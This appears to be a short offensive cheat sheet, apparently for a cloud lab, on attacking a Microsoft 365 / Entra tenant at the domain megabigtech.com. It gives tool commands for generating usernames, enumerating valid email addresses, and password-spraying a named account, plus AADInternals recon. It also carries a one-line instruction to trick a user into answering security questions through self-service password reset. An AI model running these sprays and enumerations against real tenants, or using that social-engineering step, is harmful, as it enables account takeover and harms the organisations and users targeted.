### Username-Anarch
```
./username-anarchy Jordan Kim -@ @megabigtech.com
./username-anarchy --country france --auto
```
### Email Checker
Identify Valid Domain Email Address
```
python3 oh365userfinder.py -r emails.txt
python3 o365enum.py -u email.txt -m office.com
```
### M365 Email Password Spray
```
python3 o365spray.py --username ryan.lin@megabigtech.com --passfile passwords.txt --domain megabigtech.com --lockout 1 --spray
```
### Microsoft Entra Self-Service Password Reset (SSPR)
>Microsoft Entra self-service password reset (SSPR) gives users the ability to change or reset their password, with no administrator or help desk involvement. If a user's account is locked or they forget their password, they can follow prompts to unblock themselves and get back to work.

https://aka.ms/sspr  
Then trick user to answer 3 security question

### My Apps
https://myapps.microsoft.com/index.htm to check which services this account can access.
### Tenant Id Convert to Tenant
https://osint.aadinternals.com/
### Domain Info
```
Value	Description
DNS	Does the DNS record exist?
MX	Does the MX point to Office 365?
SPF	Does the SPF contain Exchange Online?
Type	Federated or Managed
DMARC	Is the DMARC record configured?
DKIM	Is the DKIM record configured?
MTA-STS	Is the MTA-STS recored configured?
STS	The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server
RPS	Relaying parties of STS (AD FS). Requires -GetRelayingParties switch.

Invoke-AADIntReconAsOutsider -DomainName megabigtech.com
```
